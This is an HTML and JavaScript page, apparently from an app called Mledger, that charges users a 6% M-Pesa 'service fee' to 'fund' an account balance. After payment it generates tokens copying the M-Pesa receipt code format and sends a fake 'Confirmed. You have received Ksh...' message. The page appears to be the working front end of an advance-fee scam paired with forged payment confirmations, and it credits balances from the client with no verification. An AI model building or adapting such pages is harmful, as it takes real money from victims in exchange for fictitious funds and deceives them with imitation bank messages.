
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fund Account - Pay Fee Only</title>
    <style>
        :root { --primary: #4CAF50; --dark: #121212; --card: #1e1e1e; }
        body { 
            font-family: 'Segoe UI', sans-serif; background: var(--dark); color: white;
            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
        }
        .card { 
            background: var(--card); padding: 2rem; border-radius: 12px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 380px; text-align: center;
            border: 1px solid #333;
        }
        h2 { color: var(--primary); margin-bottom: 0.5rem; font-size: 1.4rem; }
        .user-info { font-size: 0.9rem; color: #aaa; margin-bottom: 1rem; }
        .balance-display { 
            background: #121212; 
            border-radius: 8px; 
            padding: 15px; 
            margin: 15px 0; 
            border: 1px solid #333; 
        }
        .balance-display .label { font-size: 0.75rem; color: #666; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
        .balance-display .amount { font-size: 1.5rem; font-weight: bold; color: var(--primary); }
        .fee-info { font-size: 0.9rem; color: #ffab00; margin: 15px 0; padding: 10px; background: rgba(255,171,0,0.1); border-radius: 6px; display: none; }
        
        label { display: block; text-align: left; font-size: 0.8rem; color: #888; margin-top: 10px; }
        input { 
            width: 100%; padding: 12px; margin: 5px 0 10px 0; border: 1px solid #444; 
            border-radius: 6px; background: #121212; color: white; box-sizing: border-box;
        }
        input:focus { border-color: var(--primary); outline: none; }
        
        button { 
            width: 100%; padding: 14px; background: var(--primary); color: white; 
            border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px;
        }
        button:disabled { background: #444; cursor: not-allowed; }
        #status { margin-top: 15px; font-size: 0.85rem; min-height: 40px; color: #ccc; }
        .loader {
            display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,.3);
            border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <h2>Fund Your Account</h2>
    <div class="user-info">Crediting Account: <span id="accPhone" style="color:var(--primary)">...</span></div>
    
    <div class="balance-display">
        <div class="label">Current Balance</div>
        <div class="amount" id="currentBalance">Loading...</div>
    </div>
    
    <label>Amount to Add to Balance (Ksh)</label>
    <input type="number" id="fundAmount" placeholder="Min 100" oninput="updateFee()">
    
    <div id="feeDisplay" class="fee-info">
        Service Fee to Pay: <strong id="stkPrice">Ksh 0.00</strong>
    </div>

    <label>Enter M-Pesa Number for Payment (Safaricom only)</label>
    <input type="text" id="paymentPhone" placeholder="07xxxxxxxx">
    
    <button id="payBtn" onclick="initiateFunding()">Pay Fee & Request Funds</button>
    
    <div id="status"></div>
    <a href="act.html" style="display:block; margin-top:20px; color:#666; text-decoration:none; font-size:0.8rem">Go Back</a>
</div>

<script>
    const BACKEND_PAYMENT = "https://newpayment-byr6.vercel.app";
    const BACKEND_FUNDS = "https://funds-mauve.vercel.app/api";
    const MESSAGE_API = "https://message-server-five.vercel.app";
    
    const userData = JSON.parse(localStorage.getItem('mledger_user'));
    if(!userData) {
        window.location.href = "index.html";
    } else {
        document.getElementById('accPhone').innerText = userData.phone;
        document.getElementById('paymentPhone').value = userData.phone;
        fetchBalance();
    }

    // --- ROBUST FETCH HELPER FOR REMOTE AREAS ---
    async function safeFetch(url, options = {}, retries = 3) {
        const statusDiv = document.getElementById('status');
        for (let i = 0; i < retries; i++) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout
                
                const response = await fetch(url, { ...options, signal: controller.signal });
                clearTimeout(timeoutId);

                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                return await response.json();
            } catch (err) {
                if (i === retries - 1) throw err;
                statusDiv.style.color = "#ffab00";
                statusDiv.innerText = `Signal weak, retrying... (${i + 1})`;
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
    }

    async function fetchBalance() {
        const balanceDiv = document.getElementById('currentBalance');
        try {
            const result = await safeFetch(`${BACKEND_FUNDS}/balance/${userData.phone}`);
            const bal = parseFloat(result.balance) || 0;
            balanceDiv.innerText = `Ksh ${bal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
        } catch (err) {
            balanceDiv.innerText = "Ksh 0.00";
        }
    }

    // --- Token format helpers ---
    function getYearLetter() { return String.fromCharCode(85 + (new Date().getFullYear() - 2026)); }
    function getMonthThirdLetter() { return "ABCDEFGHIJKLMN"[new Date().getMonth()]; }
    function getDayCode() {
        const d = new Date().getDate();
        return d <= 9 ? d.toString() : String.fromCharCode(65 + (d - 10));
    }
    function formatNumericDate() { return new Date().toLocaleDateString('en-GB'); }
    function formatTime12Hour() { return new Date().toLocaleTimeString('en-US', {hour:'numeric', minute:'2-digit', hour12:true}); }
    function generateToken() { return `${getYearLetter()}${getMonthThirdLetter()}${getDayCode()}K${Math.random().toString(36).substring(2,8).toUpperCase()}`; }

    function updateFee() {
        const amt = parseFloat(document.getElementById('fundAmount').value);
        const feeDiv = document.getElementById('feeDisplay');
        const stkSpan = document.getElementById('stkPrice');
        if (amt >= 100) {
            const fee = amt * 0.06;
            feeDiv.style.display = "block";
            stkSpan.innerText = "Ksh " + fee.toFixed(2);
        } else {
            feeDiv.style.display = "none";
        }
    }

    async function initiateFunding() {
        const amt = parseFloat(document.getElementById('fundAmount').value);
        const mpesaNumber = document.getElementById('paymentPhone').value.trim();
        const statusDiv = document.getElementById('status');
        const payBtn = document.getElementById('payBtn');

        if (isNaN(amt) || amt < 100) {
            statusDiv.style.color = "#ff5252";
            statusDiv.innerText = "Minimum funding amount is Ksh 100.00";
            return;
        }

        const stkAmount = Math.ceil(amt * 0.06); 
        payBtn.disabled = true;
        payBtn.innerHTML = '<span class="loader"></span>Connecting...';
        statusDiv.style.color = "#aaa";
        statusDiv.innerText = "Requesting fee payment...";

        try {
            const payData = await safeFetch(`${BACKEND_PAYMENT}/api/initiate`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ amount: stkAmount, phone_number: mpesaNumber })
            });

            const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);

            if (invoiceId) {
                statusDiv.innerText = "Check your phone for the M-Pesa PIN prompt.";
                startPolling(invoiceId, amt);
            } else {
                throw new Error("STK fail. Use Safaricom.");
            }
        } catch (err) {
            statusDiv.style.color = "#ff5252";
            statusDiv.innerText = "Connection failed. Please check signal.";
            resetUI();
        }
    }

    function startPolling(invoiceId, fundAmt) {
        const statusDiv = document.getElementById('status');
        let pollCount = 0;
        const pollTimer = setInterval(async () => {
            pollCount++;
            try {
                const res = await fetch(`${BACKEND_PAYMENT}/api/status/${invoiceId}`);
                const data = await res.json();
                const state = data.invoice ? data.invoice.state : data.state;

                if (state === "COMPLETE" || state === "COMPLETED") {
                    clearInterval(pollTimer);
                    statusDiv.style.color = "#4CAF50";
                    statusDiv.innerText = "✅ Fee paid! Adding funds...";
                    finalizeFunding(fundAmt);
                } else if (state === "FAILED" || state === "REJECTED" || pollCount > 40) {
                    clearInterval(pollTimer);
                    statusDiv.style.color = "#ff5252";
                    statusDiv.innerText = "❌ Transaction timed out or rejected.";
                    resetUI();
                }
            } catch (e) { }
        }, 3000);
    }

    async function finalizeFunding(amt) {
        const statusDiv = document.getElementById('status');
        try {
            const result = await safeFetch(`${BACKEND_FUNDS}/fund`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: userData.phone, amount: amt })
            });

            userData.balance = result.newBalance;
            localStorage.setItem('mledger_user', JSON.stringify(userData));
            
            const token = generateToken();
            const confirmationMsg = `${token} Confirmed. You have received Ksh${amt.toFixed(2)} from Mledger. New balance: Ksh${userData.balance.toFixed(2)}.`;

            // Background Fire-and-Forget
            fetch(`${MESSAGE_API}/api/messages`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: userData.phone, message: confirmationMsg, type: 'received' })
            }).catch(() => {});

            statusDiv.innerHTML = "<strong>✅ Funds Added!</strong>";
            setTimeout(() => window.location.href = "index.html", 2500);
        } catch (err) {
            statusDiv.style.color = "#ffab00";
            statusDiv.innerText = "Funds added, but update was slow. Refreshing...";
            setTimeout(() => window.location.href = "index.html", 3000);
        }
    }

    function resetUI() {
        const payBtn = document.getElementById('payBtn');
        payBtn.disabled = false;
        payBtn.innerText = "Pay Fee & Request Funds";
    }
</script>
</body>
</html>
